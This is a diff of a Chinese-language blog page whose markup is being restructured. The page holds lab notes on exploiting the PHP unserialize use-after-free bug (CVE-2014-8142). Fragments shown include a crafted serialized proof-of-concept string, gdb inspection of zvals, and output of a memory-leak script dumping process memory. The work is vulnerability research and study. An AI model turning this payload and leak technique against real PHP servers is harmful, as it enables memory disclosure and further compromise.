@@ -115,7 +115,7 @@
 
         <span itemprop="articleBody"><h3 id="0x00-about">0x00 About</h3>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>学习乌云中的&lt;&lt;PHP中的内存破坏漏洞利用&gt;&gt;
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>学习乌云中的&lt;&lt;PHP中的内存破坏漏洞利用&gt;&gt;
 link:http://cb.drops.wiki/drops/papers-4864.html
 cvelink:
     CVE-2014-8142
@@ -142,8 +142,7 @@ https://www.owasp.org/images/9/9e/Utilizing-Code-Reuse-Or-Return-Oriented-Progra
 http://blog.nsfocus.net/tech/技术分享/2016/08/08/PHP-unserialize.html
 
 b)理解unserialize
-</code></pre>
-</div>
+</code></pre></div></div>
 <p><img src="https://raw.githubusercontent.com/3xp10it/pic/master/unserialize1.png" />
 <img src="https://raw.githubusercontent.com/3xp10it/pic/master/unserialize2.png" />
 <img src="https://raw.githubusercontent.com/3xp10it/pic/master/unserialize3.png" />
@@ -155,7 +154,7 @@ b)理解unserialize
 <img src="https://raw.githubusercontent.com/3xp10it/pic/master/unserialize9.png" />
 <img src="https://raw.githubusercontent.com/3xp10it/pic/master/unserialize10.png" /></p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>c)本文两个难理解的问题
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>c)本文两个难理解的问题
     1.为什么unserialize后会free内存,具体原理是什么?
         [http://www.cnblogs.com/orlion/p/5350844.html]
         A:为了避免每次变量的refcount减少的时候都调用GC的算法进行垃圾判断,此算法会先把所有前面准则3情况下的zval节
@@ -235,22 +234,20 @@ d)更多关于PHP内存破坏的学习
     https://www.evonide.com/fuzzing-unserialize/
     [一个很详细的关于php垃圾回收与uaf的漏洞分析]
     http://www.freebuf.com/vuls/122938.html
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <h3 id="0x01-detail">0x01 Detail</h3>
 
 <h4 id="a调试环境">a)调试环境</h4>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>kali2 x86 
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali2 x86 
 php5.4.34
 gdb
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <h4 id="b环境配置">b)环境配置</h4>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>1.下载php5.4.34到/root/php5.4.34    
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1.下载php5.4.34到/root/php5.4.34    
     下载地址:http://php.net/get/php-5.4.34.tar.gz/from/a/mirror
     php5.4.34根目录下的.gdbinit是php为了方便被gdb调试,需要在gdb php之后source path/.gdbinit
         link:https://phpor.net/blog/post/997
@@ -322,12 +319,11 @@ gdb
     echo $obj-&gt;ccc;
     ?&gt;
     -----------end------------
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <h4 id="c调试">c)调试</h4>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>测试StefanEsser_Original_POC.php是否会导致php解释器出问题
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>测试StefanEsser_Original_POC.php是否会导致php解释器出问题
     └&gt; /usr/bin/ndphp/bin/php StefanEsser_Original_POC.php 
     int(4)
     string(134) "O:8:"stdClass":4:{s:3:"aaa";a:5:{i:0;i:1;i:1;i:2;i:2;a:1:{i:0;i:1;}i:3;i:4;i:4;i:5;}s:3:"aaa";i:1;s:3:"ccc";R:5;s:3:"ddd";s:4:"AAAA";}"
@@ -433,12 +429,11 @@ gdb
     可看出data变量是个数组,数组里面的内容是地址,这些地址指向unserialize函数解析的变量值,关注第5个0xb5c6f1c0(php
     代码中用的是R:5).
     unserialize函数解析的变量值分别为下面的各个zval的内存地址:
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p><img src="https://raw.githubusercontent.com/3xp10it/pic/master/zval1.png" /></p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>    上图中蓝色是符号,红色是zval的属性,绿色是zval的值
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    上图中蓝色是符号,红色是zval的属性,绿色是zval的值
     查看这个地址中的内容:
 
     [printzv 0xb5c6f1c0]
@@ -511,12 +506,11 @@ gdb
     ---------PHPLeak.php------------
 
     对应zval图如下:
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p><img src="https://raw.githubusercontent.com/3xp10it/pic/master/zval2.png" /></p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
     output:
     $ /usr/bin/ndphp/bin/php PHPLeak.php | hexdump -c
     0000000 177   E   L   F 001 001 001  \0  \0  \0  \0  \0  \0  \0  \0
@@ -525,8 +519,7 @@ gdb
            2197 done                hexdump -c
     这里说明可成功泄露指定地址指定长度的内存内容
 
-</code></pre>
-</div>
+</code></pre></div></div>
 </span>
 
         
